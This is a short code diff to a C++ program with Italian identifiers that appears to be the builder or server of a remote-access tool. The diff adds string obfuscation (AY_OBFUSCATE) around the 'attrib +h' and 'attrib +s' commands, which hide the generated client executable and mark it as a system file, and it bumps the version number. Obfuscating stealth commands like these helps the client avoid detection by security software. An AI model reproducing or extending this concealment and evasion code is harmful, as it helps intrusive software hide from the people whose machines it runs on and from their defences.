@@ -1,4 +1,5 @@
 #include <iostream>
+#include <obfuscate.h>
 #include <EssNet.h>
 #include <Essentials.h>
 #include <EssCurl.h>
@@ -9,7 +10,7 @@ using namespace std;
 
 #include "Client.h"
 
-string Version = "2.0.0-b.1";
+string Version = "2.0.0-b.2";
 CLIENT Clients[MAX_CLIENTS];
 atomic<bool> ServerLoopController = true;
 int VersioneCompatibile = 0;
@@ -360,9 +361,9 @@ int main()
                             Sleep(250);
 
                             if (SettaggiC.HideExe)
-                                su.NoOutputCMD("attrib +h \"" + SettaggiC.ExeName + "\"");
+                                su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + SettaggiC.ExeName + "\"");
                             if (SettaggiC.SystemFile)
-                                su.NoOutputCMD("attrib +s \"" + SettaggiC.ExeName + "\"");
+                                su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + SettaggiC.ExeName + "\"");
 
                             cli.LoadingPercentage = 75;
                             cli.LoadingText = "Personalizzazione settaggi";
@@ -461,6 +462,8 @@ int main()
                         // Aggiornamenti
                         case 2:
                             SettaggiS.VerificaAggiornamenti = !SettaggiS.VerificaAggiornamenti;
+                            if (!SettaggiS.VerificaAggiornamenti)
+                                SettaggiS.AutoAggiornamento = false;
                             break;
 
                             // Auto Aggiornamenti
